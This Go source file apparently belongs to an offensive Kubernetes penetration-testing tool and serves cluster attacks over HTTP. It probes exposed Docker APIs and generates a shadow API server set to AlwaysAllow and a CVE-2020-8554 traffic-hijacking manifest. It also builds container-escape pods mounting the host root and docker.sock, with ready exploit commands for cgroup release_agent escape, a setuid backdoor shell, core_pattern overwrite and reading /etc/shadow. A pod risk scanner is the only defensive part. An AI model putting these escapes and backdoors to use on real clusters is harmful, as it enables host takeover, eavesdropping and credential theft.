package handler

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type CDKHandler struct{}

func NewCDKHandler() *CDKHandler {
	return &CDKHandler{}
}

func (h *CDKHandler) buildClient(c *gin.Context) (*kubectl.Client, error) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		return nil, err
	}
	server := "https://" + req.TargetHost + ":6443"
	if req.Token != "" {
		return kubectl.NewClient(server, req.Token, req.SkipTLS)
	}
	return kubectl.NewClientWithUserPass(server, req.Username, req.Password, req.SkipTLS)
}

// ==================== ConfigMap Dump ====================

func (h *CDKHandler) DumpConfigMaps(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 15*time.Second)
	defer cancel()

	cmList, err := client.Clientset.CoreV1().ConfigMaps("").List(ctx, metav1.ListOptions{})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}

	results := make([]gin.H, 0, len(cmList.Items))
	for _, cm := range cmList.Items {
		keys := make([]string, 0, len(cm.Data))
		for k := range cm.Data {
			keys = append(keys, k)
		}
		for k := range cm.BinaryData {
			keys = append(keys, k+" [binary]")
		}
		results = append(results, gin.H{
			"namespace": cm.Namespace,
			"name":      cm.Name,
			"keys":      keys,
			"key_count": len(cm.Data) + len(cm.BinaryData),
		})
	}
	c.JSON(http.StatusOK, gin.H{"configmaps": results, "total": len(results)})
}

// ==================== PSP Dump ====================

func (h *CDKHandler) DumpPSP(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()

	// PSP was removed in K8s 1.25+. Use raw REST API call.
	body, err := client.Clientset.RESTClient().Get().
		AbsPath("/apis/policy/v1beta1/podsecuritypolicies").
		DoRaw(ctx)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "PSP not available (removed in K8s 1.25+): " + err.Error()})
		return
	}

	var pspList struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
			Spec struct {
				Privileged          bool     `json:"privileged"`
				HostPID             bool     `json:"hostPID"`
				HostNetwork         bool     `json:"hostNetwork"`
				HostIPC             bool     `json:"hostIPC"`
				Volumes             []string `json:"volumes"`
				AllowedCapabilities []string `json:"allowedCapabilities"`
				RunAsUser           struct {
					Rule string `json:"rule"`
				} `json:"runAsUser"`
				SELinux struct {
					Rule string `json:"rule"`
				} `json:"seLinux"`
			} `json:"spec"`
		} `json:"items"`
	}
	if err := json.Unmarshal(body, &pspList); err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "Failed to parse PSP response: " + err.Error()})
		return
	}

	results := make([]gin.H, 0, len(pspList.Items))
	for _, psp := range pspList.Items {
		results = append(results, gin.H{
			"name":            psp.Metadata.Name,
			"privileged":      psp.Spec.Privileged,
			"host_pid":        psp.Spec.HostPID,
			"host_network":    psp.Spec.HostNetwork,
			"host_ipc":        psp.Spec.HostIPC,
			"allowed_caps":    psp.Spec.AllowedCapabilities,
			"allowed_volumes": psp.Spec.Volumes,
			"run_as_user":     psp.Spec.RunAsUser.Rule,
			"se_linux":        psp.Spec.SELinux.Rule,
		})
	}
	c.JSON(http.StatusOK, gin.H{"psps": results, "total": len(results)})
}

// ==================== Docker API Pwn ====================

type dockerAPIRequest struct {
	TargetHost string `json:"target_host" binding:"required"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	Token      string `json:"token"`
	SkipTLS    bool   `json:"skip_tls"`
	TimeoutSec int    `json:"timeout_sec"`
}

func (h *CDKHandler) CheckDockerAPI(c *gin.Context) {
	var req dockerAPIRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 5
	}

	// Docker Remote API typically on port 2375 (unencrypted) or 2376 (TLS)
	for _, port := range []int{2375, 2376} {
		url := fmt.Sprintf("http://%s:%d/info", req.TargetHost, port)
		httpClient := util.BuildHTTPClient(true, req.TimeoutSec)
		resp, err := httpClient.Get(url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		if resp.StatusCode == 200 && strings.Contains(string(body), "Containers") {
			// Docker API is accessible! Try to list containers
			containersURL := fmt.Sprintf("http://%s:%d/containers/json?all=true", req.TargetHost, port)
			containersResp, err := httpClient.Get(containersURL)
			containerInfo := []gin.H{}
			if err == nil {
				defer containersResp.Body.Close()
				containersBody, _ := io.ReadAll(io.LimitReader(containersResp.Body, 32768))
				var containers []map[string]interface{}
				if json.Unmarshal(containersBody, &containers) == nil {
					for _, cnt := range containers {
						names := []string{}
						if n, ok := cnt["Names"].([]interface{}); ok {
							for _, name := range n {
								names = append(names, fmt.Sprintf("%v", name))
							}
						}
						containerInfo = append(containerInfo, gin.H{
							"id":     cnt["Id"],
							"names":  names,
							"image":  cnt["Image"],
							"state":  cnt["State"],
							"status": cnt["Status"],
						})
					}
				}
			}
			c.JSON(http.StatusOK, gin.H{
				"accessible":    true,
				"port":         port,
				"docker_info":  string(body),
				"containers":   containerInfo,
				"exploit_hint": fmt.Sprintf("Docker API accessible on port %d! Use 'cdk run docker-api-pwn' pattern: create a privileged container with host root mounted to /host", port),
			})
			return
		}
	}
	c.JSON(http.StatusOK, gin.H{"accessible": false, "hint": "Docker Remote API not exposed on 2375/2376"})
}

// ==================== Shadow API Server ====================

func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 15*time.Second)
	defer cancel()

	// Find kube-apiserver pods in kube-system
	podList, err := client.Clientset.CoreV1().Pods("kube-system").List(ctx, metav1.ListOptions{
		LabelSelector: "component=kube-apiserver",
	})
	if err != nil || len(podList.Items) == 0 {
		// Try tier label
		podList, err = client.Clientset.CoreV1().Pods("kube-system").List(ctx, metav1.ListOptions{
			LabelSelector: "tier=control-plane",
		})
	}
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "Cannot list apiserver pods: " + err.Error()})
		return
	}
	if len(podList.Items) == 0 {
		c.JSON(http.StatusOK, gin.H{"error": "No kube-apiserver pods found in kube-system"})
		return
	}

	apiserverPods := make([]gin.H, 0)
	for _, pod := range podList.Items {
		// Extract key info from apiserver pod
		containers := make([]gin.H, 0)
		for _, cnt := range pod.Spec.Containers {
			args := make([]string, 0)
			authMode := ""
			securePort := ""
			for _, arg := range cnt.Command {
				args = append(args, arg)
			}
			for _, arg := range cnt.Args {
				args = append(args, arg)
				if strings.HasPrefix(arg, "--authorization-mode=") {
					authMode = strings.TrimPrefix(arg, "--authorization-mode=")
				}
				if strings.HasPrefix(arg, "--secure-port=") {
					securePort = strings.TrimPrefix(arg, "--secure-port=")
				}
			}
			containers = append(containers, gin.H{
				"name":          cnt.Name,
				"image":         cnt.Image,
				"auth_mode":     authMode,
				"secure_port":   securePort,
				"args_preview":  args,
			})
		}

		apiserverPods = append(apiserverPods, gin.H{
			"name":       pod.Name,
			"namespace":  pod.Namespace,
			"node":       pod.Spec.NodeName,
			"containers": containers,
		})
	}

	// Generate shadow apiserver YAML hint
	shadowYAML := `# Shadow API Server - deploys a modified kube-apiserver with:
# --authorization-mode=AlwaysAllow
# --anonymous-auth=true
#
# WARNING: This requires CREATE pod permission in kube-system
# Connect to shadow apiserver at https://NODE_IP:9444
apiVersion: v1
kind: Pod
metadata:
  name: shadow-apiserver
  namespace: kube-system
  labels:
    component: kube-apiserver
    tier: control-plane
spec:
  hostNetwork: true
  containers:
  - name: kube-apiserver
    image: IMAGE_FROM_CLUSTER
    command:
    - kube-apiserver
    - --authorization-mode=AlwaysAllow
    - --anonymous-auth=true
    - --secure-port=9444
    - --etcd-servers=ETCD_ENDPOINT
    - --service-account-key-file=/etc/kubernetes/pki/sa.pub
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --tls-cert-file=/etc/kubernetes/pki/apiserver.crt
    - --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
    volumeMounts:
    - name: etc-kubernetes
      mountPath: /etc/kubernetes
      readOnly: true
  volumes:
  - name: etc-kubernetes
    hostPath:
      path: /etc/kubernetes
      type: DirectoryOrCreate`

	c.JSON(http.StatusOK, gin.H{
		"apiserver_pods": apiserverPods,
		"total":         len(apiserverPods),
		"shadow_yaml":   shadowYAML,
		"hint":          "To create shadow apiserver: 1. Copy image and etcd args from existing apiserver 2. Replace --authorization-mode with AlwaysAllow 3. Change --secure-port to 9444 4. Deploy as new pod in kube-system",
	})
}

// ==================== ClusterIP MITM (CVE-2020-8554) ====================

type mitmRequest struct {
	TargetHost string `json:"target_host" binding:"required"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	Token      string `json:"token"`
	SkipTLS    bool   `json:"skip_tls"`
	TimeoutSec int    `json:"timeout_sec"`
	TargetIP   string `json:"target_ip"`
	TargetPort int    `json:"target_port"`
}

func (h *CDKHandler) ClusterIPMITM(c *gin.Context) {
	var req mitmRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TargetIP == "" {
		req.TargetIP = "1.1.1.1" // default target for demo
	}
	if req.TargetPort == 0 {
		req.TargetPort = 443
	}

	// Generate CVE-2020-8554 exploit YAML
	mitmYAML := fmt.Sprintf(`# CVE-2020-8554: Man-in-the-Middle via ExternalIP
# Creates a LoadBalancer/NodePort Service with a malicious ExternalIP
# that hijacks traffic to %s:%d
---
apiVersion: v1
kind: Service
metadata:
  name: mitm-hijack
  namespace: default
spec:
  type: LoadBalancer
  externalIPs:
  - %s
  ports:
  - port: %d
    targetPort: %d
    protocol: TCP
  selector:
    app: mitm-backend
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mitm-backend
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: mitm-backend
  template:
    metadata:
      labels:
        app: mitm-backend
    spec:
      containers:
      - name: sniffer
        image: nicolaka/netshoot:latest
        command: ["/bin/sh"]
        args: ["-c", "tcpdump -i any -nn port %d; while true; do sleep 3600; done"]`,
		req.TargetIP, req.TargetPort, req.TargetIP, req.TargetPort, req.TargetPort, req.TargetPort)

	c.JSON(http.StatusOK, gin.H{
		"yaml": mitmYAML,
		"cve":  "CVE-2020-8554",
		"description": fmt.Sprintf(
			"Creates a Service with ExternalIP=%s. If the cluster is vulnerable, "+
				"traffic from nodes/pods to %s:%d will be hijacked to the attacker's deployment. "+
				"Use Apply to deploy this YAML.", req.TargetIP, req.TargetIP, req.TargetPort),
		"mitigated_by": "K8s 1.18+ with DenyServiceExternalIPs admission controller",
	})
}

// ==================== Unified Escape Pod ====================

type escapePodRequest struct {
	TargetHost string `json:"target_host" binding:"required"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	Token      string `json:"token"`
	SkipTLS    bool   `json:"skip_tls"`
	TimeoutSec int    `json:"timeout_sec"`
	EscapeMode string `json:"escape_mode"` // privileged, docker-sock, host-proc, cap-dac, kubelet-log
	Command    string `json:"command"`
	Namespace  string `json:"namespace"`
	NodeName   string `json:"node_name"`
}

func (h *CDKHandler) GenerateEscapePod(c *gin.Context) {
	var req escapePodRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.EscapeMode == "" {
		req.EscapeMode = "privileged"
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.Command == "" {
		req.Command = "id; cat /host/etc/shadow 2>/dev/null || echo 'No /host mount'"
	}

	podName := fmt.Sprintf("cdk-escape-%s", req.EscapeMode)
	nodeSelector := ""
	if req.NodeName != "" {
		nodeSelector = fmt.Sprintf("  nodeName: %s\n", req.NodeName)
	}

	// Build pod spec based on escape mode
	var extraVolumes, extraMounts, extraSpec string

	switch req.EscapeMode {
	case "privileged":
		// Full privileged: mount host root, use host namespaces
		extraSpec = `  hostPID: true
  hostNetwork: true
  hostIPC: true`
		extraVolumes = `  - name: host-root
    hostPath:
      path: /
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket`
		extraMounts = `    - name: host-root
      mountPath: /host
    - name: docker-sock
      mountPath: /var/run/docker.sock`

	case "docker-sock":
		// Only need docker.sock mount
		extraVolumes = `  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket`
		extraMounts = `    - name: docker-sock
      mountPath: /var/run/docker.sock`

	case "host-proc":
		// Mount host /proc for core_pattern exploit
		extraVolumes = `  - name: host-proc
    hostPath:
      path: /proc`
		extraMounts = `    - name: host-proc
      mountPath: /host/proc`

	case "cap-dac":
		// CAP_DAC_READ_SEARCH + host file bind mount
		extraVolumes = `  - name: host-etc
    hostPath:
      path: /etc`
		extraMounts = `    - name: host-etc
      mountPath: /host/etc`

	case "kubelet-log":
		// /var/log mount for kubelet log escape
		extraVolumes = `  - name: var-log
    hostPath:
      path: /var/log`
		extraMounts = `    - name: var-log
      mountPath: /var/log
      readOnly: false`

	default:
		extraVolumes = `  - name: host-root
    hostPath:
      path: /`
		extraMounts = `    - name: host-root
      mountPath: /host`
	}

	privileged := ""
	if req.EscapeMode == "privileged" || req.EscapeMode == "cap-dac" {
		privileged = `  containers:
  - name: escape
    image: alpine:3.20
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true`
	} else {
		privileged = `  containers:
  - name: escape
    image: alpine:3.20
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: false`
	}

	yaml := fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  name: %s
  namespace: %s
  labels:
    app: cdk-escape
    cdk-mode: %s
spec:
%s
%s%s
%s%s
  restartPolicy: Never`,
		podName, req.Namespace, req.EscapeMode, nodeSelector, extraSpec,
		privileged, extraVolumes, extraMounts)

	// Generate post-deploy exploit commands
	exploitCommands := h.getExploitCommands(req.EscapeMode)

	c.JSON(http.StatusOK, gin.H{
		"yaml":              yaml,
		"escape_mode":       req.EscapeMode,
		"namespace":        req.Namespace,
		"pod_name":         podName,
		"exploit_commands": exploitCommands,
		"description":      getEscapeDescription(req.EscapeMode),
		"workflow": gin.H{
			"step1": "Apply this YAML via kubectl Apply or Access → API Server Request",
			"step2": fmt.Sprintf("Wait for pod %s/%s to be Running", req.Namespace, podName),
			"step3": "Exec into pod via Exec Tab or Kubelet Exec",
			"step4": "Run exploit commands shown below",
		},
	})
}

func (h *CDKHandler) getExploitCommands(mode string) []gin.H {
	commands := map[string][]string{
		"privileged": {
			"# Privileged Container Escape via cgroup release_agent",
			"mkdir -p /tmp/cdk_cgroup && mount -t cgroup -o memory cgroup /tmp/cdk_cgroup",
			"mkdir -p /tmp/cdk_cgroup/x",
			"echo 1 > /tmp/cdk_cgroup/x/notify_on_release",
			"# Find host path from overlay mount",
			"host_path=$(sed -n 's/.*upperdir=\\([^,]*\\)\\/diff.*/\\1/p' /proc/self/mountinfo | head -1)",
			"echo '#!/bin/sh' > /tmp/cdk_cmd && echo 'id > '\"$host_path\"'/output.txt' >> /tmp/cdk_cmd",
			"chmod +x /tmp/cdk_cmd",
			"echo \"$host_path/tmp/cdk_cmd\" > /tmp/cdk_cgroup/x/release_agent",
			"sh -c 'echo $$ > /tmp/cdk_cgroup/x/cgroup.procs'",
			"cat $host_path/output.txt 2>/dev/null || echo 'Check /host/tmp/ for output'",
			"",
			"# Alternative: Mount host disk directly",
			"fdisk -l 2>/dev/null | head -20",
			"mount /dev/sda1 /mnt 2>/dev/null && ls /mnt/",
		},
		"docker-sock": {
			"# Docker Socket Escape",
			"apk add curl 2>/dev/null || true",
			"# List containers via docker socket",
			"curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -200",
			"# Create privileged container with host root mounted",
			`curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json"`,
			`-d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","cp /bin/sh /host/tmp/backdoor; chmod u+s /host/tmp/backdoor"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'`,
			`http://localhost/containers/create`,
		},
		"host-proc": {
			"# Host /proc core_pattern Escape",
			"# Write a command to /proc/sys/kernel/core_pattern",
			"echo '|/host/proc/self/cwd/payload.sh' > /host/proc/sys/kernel/core_pattern 2>/dev/null || echo 'No write access'",
			"echo '#!/bin/sh' > /tmp/payload.sh && echo 'id > /tmp/pwned' >> /tmp/payload.sh && chmod +x /tmp/payload.sh",
			"# Trigger core dump to execute payload",
			"sleep 10 & kill -SEGV $! 2>/dev/null",
		},
		"cap-dac": {
			"# CAP_DAC_READ_SEARCH - Read host files",
			"apk add file 2>/dev/null || true",
			"# Read host shadow file via open_by_handle_at()",
			"cat /host/etc/shadow 2>/dev/null || echo 'Shadow not accessible'",
			"cat /host/etc/passwd 2>/dev/null",
			"ls -la /host/etc/kubernetes/ 2>/dev/null",
		},
		"kubelet-log": {
			"# Kubelet /var/log Symlink Escape",
			"# Find kubelet on node IP",
			"node_ip=$(ip route | grep default | awk '{print $3}')",
			"# Create symlink to target file and read via kubelet /logs/",
			"ln -sf /etc/kubernetes/pki/ca.crt /var/log/ca-crt-leak.log 2>/dev/null",
			"# Fetch via kubelet (may need token)",
			"curl -sk https://$node_ip:10250/logs/ca-crt-leak.log 2>/dev/null | head -20",
			"# Try anonymous access",
			"curl -sk http://$node_ip:10255/logs/ca-crt-leak.log 2>/dev/null | head -20",
		},
	}

	cmds, ok := commands[mode]
	if !ok {
		cmds = commands["privileged"]
	}

	result := make([]gin.H, 0, len(cmds))
	for _, cmd := range cmds {
		result = append(result, gin.H{"cmd": cmd})
	}
	return result
}

func getEscapeDescription(mode string) string {
	descriptions := map[string]string{
		"privileged":   "经典特权容器逃逸：挂载宿主机根目录，利用 cgroup release_agent 或直接挂载磁盘获取宿主机权限",
		"docker-sock":  "Docker Socket 逃逸：利用挂载的 docker.sock 创建特权容器，挂载宿主机文件系统",
		"host-proc":    "core_pattern 逃逸：利用挂载的宿主机 /proc，覆写 core_pattern 实现命令执行",
		"cap-dac":      "CAP_DAC_READ_SEARCH 逃逸：利用该 capability 绕过文件权限检查，读取宿主机敏感文件",
		"kubelet-log":  "Kubelet /var/log 逃逸：利用 /var/log 挂载创建符号链接，通过 kubelet /logs/ 端点读取任意文件",
	}
	if d, ok := descriptions[mode]; ok {
		return d
	}
	return "通用逃逸 Pod"
}

// ==================== Assess Escape Potential ====================

func (h *CDKHandler) AssessEscape(c *gin.Context) {
	client, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 20*time.Second)
	defer cancel()

	// List all pods
	podList, err := client.Clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "Failed to list pods: " + err.Error()})
		return
	}

	highRisk := make([]escapeRiskItem, 0)
	mediumRisk := make([]escapeRiskItem, 0)
	allResults := make([]escapeRiskItem, 0)

	for _, pod := range podList.Items {
		risk := escapeRiskItem{
			Namespace: pod.Namespace,
			Name:      pod.Name,
			Node:      pod.Spec.NodeName,
			Status:    string(pod.Status.Phase),
		}

		// Check each container
		for _, cnt := range pod.Spec.Containers {
			if cnt.SecurityContext != nil {
				if cnt.SecurityContext.Privileged != nil && *cnt.SecurityContext.Privileged {
					risk.Privileged = true
				}
				if cnt.SecurityContext.Capabilities != nil {
					for _, cap := range cnt.SecurityContext.Capabilities.Add {
						capStr := string(cap)
						risk.Capabilities = append(risk.Capabilities, capStr)
						if capStr == "SYS_ADMIN" || capStr == "CAP_SYS_ADMIN" {
							if !containsStr(risk.RiskReasons, "CAP_SYS_ADMIN") {
								risk.RiskReasons = append(risk.RiskReasons, "CAP_SYS_ADMIN")
							}
						}
						if capStr == "DAC_READ_SEARCH" || capStr == "CAP_DAC_READ_SEARCH" {
							if !containsStr(risk.RiskReasons, "CAP_DAC_READ_SEARCH") {
								risk.RiskReasons = append(risk.RiskReasons, "CAP_DAC_READ_SEARCH")
							}
						}
					}
				}
			}
		}

		// Check pod-level security context
		if pod.Spec.HostPID {
			risk.HostPID = true
			risk.RiskReasons = append(risk.RiskReasons, "hostPID")
		}
		if pod.Spec.HostNetwork {
			risk.HostNetwork = true
			risk.RiskReasons = append(risk.RiskReasons, "hostNetwork")
		}
		if pod.Spec.HostIPC {
			risk.HostIPC = true
			risk.RiskReasons = append(risk.RiskReasons, "hostIPC")
		}

		// Check volumes for host mounts and docker.sock
		for _, vol := range pod.Spec.Volumes {
			if vol.HostPath != nil {
				risk.HostMounts = append(risk.HostMounts, vol.HostPath.Path)
				risk.RiskReasons = append(risk.RiskReasons, "hostPath:"+vol.HostPath.Path)
			}
			if vol.Name == "docker-sock" || (vol.HostPath != nil && vol.HostPath.Path == "/var/run/docker.sock") {
				risk.DockerSock = true
				risk.RiskReasons = append(risk.RiskReasons, "docker.sock mounted")
			}
		}

		// Determine risk level
		riskScore := 0
		if risk.Privileged {
			riskScore += 3
		}
		if risk.HostPID || risk.HostNetwork || risk.HostIPC {
			riskScore += 2
		}
		if len(risk.HostMounts) > 0 {
			riskScore += 2
		}
		if risk.DockerSock {
			riskScore += 3
		}
		if len(risk.Capabilities) > 0 {
			riskScore += 1
		}

		switch {
		case riskScore >= 5:
			risk.RiskLevel = "critical"
			highRisk = append(highRisk, risk)
		case riskScore >= 3:
			risk.RiskLevel = "high"
			highRisk = append(highRisk, risk)
		case riskScore >= 1:
			risk.RiskLevel = "medium"
			mediumRisk = append(mediumRisk, risk)
		default:
			risk.RiskLevel = "low"
		}

		if riskScore > 0 {
			allResults = append(allResults, risk)
		}
	}

	totalPods := len(podList.Items)
	riskyCount := len(allResults)

	c.JSON(http.StatusOK, gin.H{
		"total_pods":   totalPods,
		"risky_count":  riskyCount,
		"high_risk":    highRisk,
		"medium_risk":  mediumRisk,
		"all_risks":    allResults,
		"summary": gin.H{
			"critical_privileged": countWhere(allResults, func(r escapeRiskItem) bool { return r.Privileged }),
			"host_namespace":      countWhere(allResults, func(r escapeRiskItem) bool { return r.HostPID || r.HostNetwork || r.HostIPC }),
			"host_mounts":         countWhere(allResults, func(r escapeRiskItem) bool { return len(r.HostMounts) > 0 }),
			"docker_sock":         countWhere(allResults, func(r escapeRiskItem) bool { return r.DockerSock }),
			"privileged_containers": countWhere(allResults, func(r escapeRiskItem) bool { return r.Privileged }),
		},
	})
}

type escapeRiskItem struct {
	Namespace    string   `json:"namespace"`
	Name         string   `json:"name"`
	Node         string   `json:"node"`
	Status       string   `json:"status"`
	Privileged   bool     `json:"privileged"`
	HostPID      bool     `json:"host_pid"`
	HostNetwork  bool     `json:"host_network"`
	HostIPC      bool     `json:"host_ipc"`
	Capabilities []string `json:"capabilities"`
	HostMounts   []string `json:"host_mounts"`
	DockerSock   bool     `json:"docker_sock"`
	RiskLevel    string   `json:"risk_level"`
	RiskReasons  []string `json:"risk_reasons"`
}

func containsStr(list []string, s string) bool {
	for _, item := range list {
		if item == s {
			return true
		}
	}
	return false
}

func countWhere(items []escapeRiskItem, pred func(escapeRiskItem) bool) int {
	n := 0
	for _, item := range items {
		if pred(item) {
			n++
		}
	}
	return n
}

